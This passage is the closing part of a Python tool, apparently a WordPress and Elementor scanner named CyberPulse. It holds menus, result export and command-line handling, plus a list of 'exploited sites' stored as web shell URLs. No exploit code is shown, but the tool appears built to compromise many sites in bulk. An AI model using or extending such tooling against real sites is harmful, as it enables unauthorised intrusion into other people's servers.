            else:
                console.print("\n[bold yellow]No scan results available.[/bold yellow]")
        elif choice == "2":
            if self.vulnerable_sites:
                table = Table(title="Vulnerable Sites")
                table.add_column("URL", style="cyan")
                
                for site in self.vulnerable_sites:
                    table.add_row(site)
                
                console.print(table)
            else:
                console.print("\n[bold yellow]No vulnerable sites found.[/bold yellow]")
        elif choice == "3":
            # Check for exploited sites file
            exploited_file = os.path.join('results', 'exploited_sites.txt')
            
            if os.path.exists(exploited_file):
                with open(exploited_file, 'r') as f:
                    exploited_sites = [line.strip() for line in f if line.strip()]
                
                if exploited_sites:
                    table = Table(title="Exploited Sites")
                    table.add_column("Shell URL", style="cyan")
                    
                    for site in exploited_sites:
                        table.add_row(site)
                    
                    console.print(table)
                else:
                    console.print("\n[bold yellow]No exploited sites found.[/bold yellow]")
            else:
                console.print("\n[bold yellow]No exploited sites found.[/bold yellow]")
        elif choice == "4":
            if self.results:
                # Export options
                console.print("\nExport Format:")
                console.print("  [1] JSON")
                console.print("  [2] CSV")
                console.print("  [3] Text")
                console.print("\n")
                
                export_choice = input("Enter your choice: ")
                
                export_file = os.path.join('results', f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
                
                if export_choice == "1":
                    with open(export_file + ".json", 'w') as f:
                        json.dump(self.results, f, indent=4)
                    console.print(f"\n[bold green]Results exported to {export_file}.json[/bold green]")
                elif export_choice == "2":
                    with open(export_file + ".csv", 'w') as f:
                        f.write("URL,Domain,WordPress,Elementor,Vulnerable,Exploited,Timestamp\n")
                        for result in self.results:
                            f.write(f"{result['url']},{result['domain']},{result['wordpress']},{result['elementor']},{result['vulnerable']},{result['exploited']},{result['timestamp']}\n")
                    console.print(f"\n[bold green]Results exported to {export_file}.csv[/bold green]")
                elif export_choice == "3":
                    with open(export_file + ".txt", 'w') as f:
                        f.write("CyberPulse Scan Results\n")
                        f.write("=" * 50 + "\n\n")
                        for result in self.results:
                            f.write(f"URL: {result['url']}\n")
                            f.write(f"Domain: {result['domain']}\n")
                            f.write(f"WordPress: {'Yes' if result['wordpress'] else 'No'}\n")
                            f.write(f"Elementor: {'Yes' if result['elementor'] else 'No'}\n")
                            f.write(f"Vulnerable: {'Yes' if result['vulnerable'] else 'No'}\n")
                            f.write(f"Exploited: {'Yes' if result['exploited'] else 'No'}\n")
                            f.write(f"Timestamp: {result['timestamp']}\n")
                            f.write("-" * 50 + "\n\n")
                    console.print(f"\n[bold green]Results exported to {export_file}.txt[/bold green]")
            else:
                console.print("\n[bold yellow]No scan results available.[/bold yellow]")

def main():
    """Main function"""
    # Check for required dependencies
    try:
        from colorama import Fore, Style
        from tqdm import tqdm
    except ImportError:
        print("[!] Required dependencies not found. Installing...")
        setup_environment()
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="CyberPulse - WordPress Security Testing Framework")
    parser.add_argument('-t', '--targets', help='Path to targets file')
    parser.add_argument('-o', '--output', help='Output directory for results')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
    parser.add_argument('--scan', action='store_true', help='Start scan immediately')
    args = parser.parse_args()
    
    # Initialize the framework
    framework = CyberPulseFramework()
    
    # Update settings from command line
    if args.threads:
        framework.threads = args.threads
    
    if args.timeout:
        framework.timeout = args.timeout
    
    if args.output:
        os.makedirs(args.output, exist_ok=True)
        framework.output_dir = args.output
    
    # Display banner
    framework.display_banner()
    
    # Load targets if specified
    if args.targets:
        if os.path.exists(args.targets):
            framework.load_targets(args.targets)
        else:
            framework.log_error(f"Target file not found: {args.targets}")
    
    # Start scan if requested
    if args.scan and framework.targets:
        framework.scan_targets()
    
    # Show main menu
    framework.show_main_menu()

if __name__ == "__main__":
    # Disable warnings
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] An error occurred: {str(e)}")
        sys.exit(1)
